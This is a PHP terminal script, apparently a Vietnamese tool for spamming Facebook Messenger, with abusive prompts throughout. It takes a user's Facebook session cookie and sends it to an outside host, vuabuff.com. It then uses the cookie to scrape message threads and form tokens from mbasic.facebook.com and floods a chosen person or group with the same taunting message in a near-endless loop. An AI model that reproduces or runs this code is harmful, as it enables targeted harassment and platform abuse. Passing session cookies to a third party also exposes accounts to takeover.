<?php
error_reporting(0);
session_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
$xnhac = "\033[1;36m";
$do = "\033[1;31m";
$luc = "\033[1;32m";
$vang = "\033[1;33m";
$xduong = "\033[1;34m";
$hong = "\033[1;35m";
$trang = "\033[1;37m";
$cyan= "\e[1;36m";
$thanh_xau= $do."[" . $trang . "🥶" . $do . "] ".$trang."👉 ";
$thanh_dep= $do."[" . $trang . "🥶" . $do . "] ".$trang."👉 ";
$thanh = $trang."👉 ";
$vinh = $trang."\033[1;36m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
$ip = file_get_contents("https://vtoolvip.tk/ip.php");
$useragent = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36';
$_SESSION['US_SPAM_MESS'] = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36";
/***[ Time ]***/
$today= date('d-m-y');
$a = date("d"); 
$b = date("m"); 
$c = date("Y");
$ngay = date("d"); 
$thang = date("m"); 
$nam = date("Y");
$day= date('d-m-y');
$d = date("d-m");
$weekday = date("l");
/***[ Banner ]***/
$thuong = $do."[".$luc."∆".$do."]".$trang." ➡️ ";
$thanhngang = $vang."-------------------------------------------------------------\n";
$weekday = date("l"); 
$ngay = date("d"); 
$thang = date("m"); 
$nam = date("Y"); 
$weekday = strtolower($weekday);switch($weekday) { case 'monday': $weekday = "\033[1;33mThứ\033[1;36m 2"; break; case 'tuesday': $weekday = "\033[1;33mThứ\033[1;36m 3"; break; case 'wednesday': $weekday = "\033[1;33mThứ \033[1;36m4"; break; case 'thursday': $weekday = "\033[1;33mThứ \033[1;36m5"; break; case 'friday': $weekday = "\033[1;33mThứ\033[1;36m 6"; break; case 'saturday': $weekday = "\033[1;33mThứ \033[1;36m7"; break; default: $weekday = "\033[1;33mCN"; break; }
$banner = "
        \033[1;37m            ▇▇◤▔▔▔▔▔▔▔◥▇▇
        \033[1;37m            ▇▇▓◥▇◣┊◢▇◤▓▇▇
        \033[1;37m            ▇▇▓▃▆▅▎▅▆▃▓▇▇
        \033[1;37m            ▇▇▓╱▔▕▎▔▔╲▓▇▇
        \033[1;37m            ▇▇◣◣▃▅▎▅▃◢◢▇▇
        \033[1;37m            ▇▇▇◣◥▅▅▅◤◢▇▇▇
        \033[1;37m            ◥▇▇▇◣╲▇╱◢▇▇▇◤
\033[1;36m────\033[1;31────\033[1;32m────\033[1;33m────\033[1;34m────\033[1;35m────\033[1;36m────\033[1;37m────\033[1;31m────\033[1;32m────\033[1;33m────\033[1;34m────\033[1;35m────\033[1;36m────\033[1;37m────
\033[1;36m         Setup Lại Tool By AnhㅤLàㅤTdat😘
 ( O F F )
\033[1;36m────\033[1;31────\033[1;32m────\033[1;33m────\033[1;34m────\033[1;35m────\033[1;36m────\033[1;37m────\033[1;31m────\033[1;32m────\033[1;33m────\033[1;34m────\033[1;35m────\033[1;36m────\033[1;37m────\n";
/***[ Clear + Thông Số Admin ]***/
    while(true){
   system('clear');
   echo $banner;
        if(file_exists("Pain.txt")){
            system('clear');
            echo $banner;
            echo $thanh_dep.$xnhac."Nhập ".$do."[".$trang."1".$do."]".$xnhac." Bem Cookie Cũ\n";
            echo $thanh_dep.$xnhac."Nhập ".$do."[".$trang."2".$do."]".$xnhac." Bem Cookie Mới\n";
            echo $thanh_dep.$xnhac."Nhập số: " . $vang;
            $_SESSION['nhapcc'] = trim(fgets(STDIN));
         if ($_SESSION['nhapcc'] == 1){
         	echo $xnhac."Đợi tý cha tdat mò lại 🍪 hihi><😋\n";
         	sleep(2);
         	break;
         } else {
                unlink("Pain.txt");
            }
        } else {
        echo $thanh_dep.$xnhac."Phang Cái Cookie Đi Ta Thằng Ngu lồn: ".$vang;
        $_SESSION['CK_SPAM_MESS'] = trim(fgets(STDIN));        
		$token_me =  file_get_contents("https://vuabuff.com/api/token/EAAG.php?cookie=".urlencode($_SESSION['CK_SPAM_MESS'])."&2fa=".$haifa);
        $k = fopen("Pain.txt","w+");
        fwrite($k, $_SESSION['CK_SPAM_MESS']."\n".$_SESSION['US_SPAM_MESS']);
        fclose($k);
        break;
        }
    }
  
    system('clear');
    echo $banner;
    $read = file("Pain.txt",FILE_IGNORE_NEW_LINES);
    $_SESSION['CK_SPAM_MESS'] = $read[0];
    $_SESSION['US_SPAM_MESS'] = $read[1];
    $_SESSION['HD_SPAM_MESS'] = array(
        "Cookie:".$_SESSION['CK_SPAM_MESS'],
        "Host:mbasic.facebook.com",
        "user-agent:".$_SESSION['US_SPAM_MESS'],
        "sec-fetch-site:same-origin",
        "sec-fetch-mode:navigate",
        "sec-fetch-user:?1",
        "sec-fetch-dest:document",
        "upgrade-insecure-requests:1");
        fopen("idlink.txt","w+");
    $_SESSION['DATA_SPAM_MESS'] = getallspam($thanh,$thanh_dep, $do, $trang, $luc, $vinh);
    system('clear');
    echo $xnhac."Tên thằng mày muốn chửi đi\n";
    echo $xnhac."Không cần thì bấm enter chuyển tiếp: ".$xnhac;
    $va = trim(fgets(STDIN));
    system('clear');
    echo "Nhập Tốc Độ Muốn Spam Đi Thằng Ngu😏👈: ".$vang;
    $delay = trim(fgets(STDIN));
    $sl = 0;
$dungtool = 70000000000;
    system('clear');
    echo $banner;
    $dem=0;
    while(true){   
$vanh['dz'] = [
"🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐

🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐

🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐

🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐

🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐

🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐

🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐

🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐

🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐

🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐

🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐

🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐

🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐

🪐✨𝙩𝙞𝙚̂́𝙣 𝙙𝙖̣𝙩  𝙙𝙖̃ 𝙩𝙧𝙚𝙤 𝙩𝙝𝙞̀ 𝙖𝙣𝙝 𝙪̛𝙤̛́𝙘 𝙘𝙖𝙮 𝙣𝙝𝙖 𝙢𝙖̂́𝙮 𝙩𝙝𝙖̆̀𝙣𝙜 𝙚𝙢☄️✨🪐
,];

$emojis = ['','','','',''];
    $icontay = ['','','','','',''];
if (!isset($_SESSION['current_index'])) {
    $_SESSION['current_index'] = 0;
} else {
    $_SESSION['current_index'] = ($_SESSION['current_index'] + 1) % count($vanh['dz']);
}
    $nhayy = $vanh['dz'][$_SESSION['current_index']];
    $icon = $emojis[array_rand($emojis)];
    $iconhai = $dem%count($icontay);
    $iconba = $icontay[$iconhai]; 
    $_SESSION['ND_SPAM_MESS'] = $nhayy . ' ' . $icon . ' ' . $iconba;    
    $data_1 = $_SESSION['DATA_SPAM_MESS'];
    $data_1 = str_replace("<NDSEND>", $_SESSION['ND_SPAM_MESS'], $data_1);
    $data_1 = str_replace("<DEM>", $dem_stt_messs,$data_1);
    $nd_messs = str_replace("<DEM>", $dem_stt_messs,$_SESSION['ND_SPAM_MESS']);
    $_SESSION['ND_SPAM_MESS1'] = $nd_messs;
    $curl = curl_init();
    curl_setopt_array($curl, array(
    CURLOPT_PORT => "443",
    CURLOPT_URL => "https://mbasic.facebook.com/messages/send/?icm=1&refid=12",
    CURLOPT_ENCODING => "",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_POSTFIELDS => $data_1,
    CURLOPT_HTTPHEADER => $_SESSION['HD_SPAM_MESS']));
    $x = curl_exec($curl); curl_close($curl);
        $dem++;
echo "\033[1;36m⌠\e[1;34mBây giờ là \e[1;37m".date("H:i:s")."\e[1;36m⌡\e[1;33m tdat 𝚌𝚞𝚝𝚒𝚜𝟷 𝚜𝚎𝚟𝚎𝚛 𝚟𝚒 𝚎𝚗🐳💦 \e[1;36m Cha tdat đã chửi thằng ngu kia\e[1;34m".$dem." \e[1;36mlần!\n\033[1;".rand(31,37)."m"." Ank  Là Tdat 𝑐𝑢𝑡𝑖☻
(^=◕ᴥ◕=^)\n";
$sl++;
		if ($sl < $dungtool){
	delay($delay);
		} else {
                echo "\n".$thanh_dep."\033[1;36mSpam Xong Rồi Thằng Đầu Buồi                                                  \r\n";
			die();
		}
    }
function getallspam($thanh,$thanh_dep, $xnhac, $trang, $luc, $vinh){
    $curl = curl_init();
    curl_setopt_array($curl, array(
    CURLOPT_PORT => "443",
    CURLOPT_URL => "https://mbasic.facebook.com/messages/?ref_component=mbasic_home_header&ref_page=MMessagingThreadlistController&refid=11",
    CURLOPT_ENCODING => "",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => "GET",
    CURLOPT_HTTPHEADER => $_SESSION['HD_SPAM_MESS']));
    $x = curl_exec($curl); curl_close($curl);
    if(strpos($x, "/messages/read/?")){
    for($i=1;$i<50;$i++){
    $getinfo = explode("<img",explode('/messages/read/?',$x)[$i])[0]; 
    if($getinfo ==! ""){
    $getname = explode("<",explode(">",$getinfo)[1])[0];
    echo $thanh.$do."[".$trang.$i.$do."]"."\033[1;".rand(31,37)."m ".$getname."\n";
    $getidlink = explode("#fua",$getinfo)[0];
    $aslink = "/messages/read/?".$getidlink;
    $k = fopen("idlink.txt","a");
    fwrite($k, $aslink."\n");
    fclose($k);
    }else{break;}
    }
    }else{echo "Die 🍪 Rồi Xem Lại Acc Đêy🥶⚠⚠⚠";exit;}
    while(true){
    	echo $vinh;
    echo $thanh_dep.$xnhac."Chọn Nhóm Hoặc Thằng Ngu Để Nhây: $vang";
    $acc = trim(fgets(STDIN));
    if(is_numeric($acc)){
    $line = file("idlink.txt", FILE_IGNORE_NEW_LINES);
    $acc--;
    global $asslink;
    global $csid;
    $asslink = $line[$acc];
    break;}else{echo "Nhập Số Mà Thằng Ngu"."\n";}
    } 	
    $curl = curl_init();
    curl_setopt_array($curl, array(
    CURLOPT_PORT => "443",
    CURLOPT_URL => "https://mbasic.facebook.com".$asslink,
    CURLOPT_ENCODING => "",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => "GET",
    CURLOPT_HTTPHEADER => $_SESSION['HD_SPAM_MESS']));
    $x = curl_exec($curl); curl_close($curl);
    for($t=1;$t<20;$t++){
    $d1 = explode(">",explode('<input type="hidden"',$x)[$t])[0];
    $getd = explode('"',explode('value="',$d1)[1])[0];
    if(strpos($d1, "fb_dtsg")){$fb_dtsg=$getd;}
    if(strpos($d1, "jazoest")){$jazoest=$getd;}
    if(strpos($d1, "tids")){$tids=$getd;}
    if(strpos($d1, "wwwupp")){$wwwupp=$getd;}
    if(strpos($d1, "ids")){$ids=$getd;}
    if(strpos($d1, "cver")){$cver=$getd;}
    if(strpos($d1, "csid")){$csid=$getd;break;}
    }
    $data = "fb_dtsg=".$fb_dtsg."&jazoest=".$jazoest."&body=‎‎<NDSEND>&send=Gửi&tids=".$tids."&wwwupp=".$wwwupp."&ids[".$ids."]=".$ids."&referrer=&ctype=&cver=".$cver."&csid=".$csid;
    return $data;
}
function delay ($delay){
        for($tt = $delay ;$tt>= 1;$tt--){
        echo "\r\033[1;33m   tdat💗 \033[1;36m | $tt | "; usleep(90000);
        echo "\r\033[1;31m   tdat💖 \033[0;36m | $tt | "; usleep(90000);
        echo "\r\033[1;32m   tdat❤️ \033[0;36m | $tt | "; usleep(90000);
        echo "\r\033[1;34m   tdat💛 \033[0;36m | $tt | "; usleep(90000);
        echo "\r\033[1;35m   tdat💚 \033[0;36m | $tt | "; usleep(90000);
        echo "\r\033[1;35m   tdat💝 \033[0;36m | $tt | "; usleep(90000);
        echo "\r\033[1;36m   tdat🧡 \033[0;36m | $tt | "; usleep(90000);
        echo "\r\033[1;37m   tdat💙 \033[0;36m | $tt | "; usleep(90000);
        echo "\r\033[1;33m   tdat🖤 \033[0;36m | $tt | "; usleep(90000); 
        echo "\r\033[1;32m   tdat💗  \033[0;36m | $tt | "; usleep(90000);}
echo "\r\e[1;36m     💗 dca tdat aka 𝐜𝐮𝐭𝐢𝐬1𝐭𝐠💗                       \r";
}